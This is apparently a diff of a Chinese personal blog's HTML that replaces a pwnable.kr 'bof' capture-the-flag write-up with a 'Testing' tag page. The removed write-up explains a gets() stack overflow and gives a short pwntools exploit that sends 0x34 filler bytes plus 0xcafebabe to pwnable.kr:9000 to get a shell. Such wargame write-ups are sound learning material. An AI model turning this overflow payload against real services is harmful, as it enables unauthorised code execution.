@@ -79,22 +79,13 @@
 
 
 
-<meta name="description" content="Pwnable.kr的第三道题目bof的writeup">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr bof">
-<meta property="og:url" content="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="X3h1n">
+<meta property="og:url" content="http://x3h1n.github.io/tags/Testing/index.html">
 <meta property="og:site_name" content="X3h1n">
-<meta property="og:description" content="Pwnable.kr的第三道题目bof的writeup">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/1.PNG">
-<meta property="og:image" content="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/2.PNG">
-<meta property="og:image" content="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/3.PNG">
-<meta property="og:image" content="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/4.PNG">
-<meta property="og:updated_time" content="2018-08-30T09:58:33.749Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr bof">
-<meta name="twitter:description" content="Pwnable.kr的第三道题目bof的writeup">
-<meta name="twitter:image" content="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/1.PNG">
+<meta name="twitter:title" content="X3h1n">
 
 
 
@@ -124,13 +115,13 @@
 
 
 
-  <link rel="canonical" href="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/"/>
+  <link rel="canonical" href="http://x3h1n.github.io/tags/Testing/"/>
 
 
 
 
 
-  <title>pwnable.kr bof | X3h1n</title>
+  <title>标签: Testing | X3h1n</title>
   
 
 
@@ -149,7 +140,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -233,156 +224,54 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block tag">
 
-  
+    <div id="posts" class="posts-collapse">
+      <div class="collection-title">
+        <h1>Testing<small>标签</small>
+        </h1>
+      </div>
 
-  
-  
-  
+      
+        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2018/08/28/pwnable-kr-bof/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="X3h1n">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h2 class="post-title">
         
-        
-          <h1 class="post-title" itemprop="name headline">pwnable.kr bof</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
+            <a class="post-title-link" href="/2019/02/25/test/" itemprop="url">
               
-                <span class="post-meta-item-text">发表于</span>
+                <span itemprop="name">测试文章</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-28T20:14:09+08:00">
-                2018-08-28
-              </time>
-            
+            </a>
+        
+      </h2>
 
-            
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated"
+              datetime="2019-02-25T20:43:34+08:00"
+              content="2019-02-25" >
+          02-25
+        </time>
+      </div>
 
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <p>Pwnable.kr的第三道题目bof的writeup</p>
-<a id="more"></a>
-<p>下载二进制程序bof，可以看到该程序为32位，开了canary栈保护和NX栈不可执行：</p>
-<p><img src="/2018/08/28/pwnable-kr-bof/1.PNG" alt="1"></p>
-<p>将程序拖入IDA，可以看到程序为gets函数缓冲区溢出，目标是通过输入s覆盖a1为0xcafebabe，即可获得shell。</p>
-<p><img src="/2018/08/28/pwnable-kr-bof/2.PNG" alt="2"></p>
-<p>关键是求得s和a1的偏移，在IDA里可以看到，s的地址为[ebp+s]，即[ebp-0x2C]，a1的地址为[ebp+arg_0]，即[ebp+0x8]，偏移为0x2C+0x8=0x34：</p>
-<p><img src="/2018/08/28/pwnable-kr-bof/3.PNG" alt="3"></p>
-<p>因此最终的攻击脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x34</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>执行脚本，获得shell，进而得到flag：</p>
-<p><img src="/2018/08/28/pwnable-kr-bof/4.PNG" alt="4"></p>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/08/28/pwnable-kr-collision/" rel="next" title="pwnable.kr collision">
-                <i class="fa fa-chevron-left"></i> pwnable.kr collision
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/28/pwnable-kr-flag/" rel="prev" title="pwnable.kr flag">
-                pwnable.kr flag <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
-
-    <div class="post-spread">
       
     </div>
+
   </div>
+  
+  
+  
+
+  
 
 
           </div>
@@ -390,10 +279,6 @@
 
 
           
-
-  
-
-
 
         </div>
         
@@ -606,10 +491,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
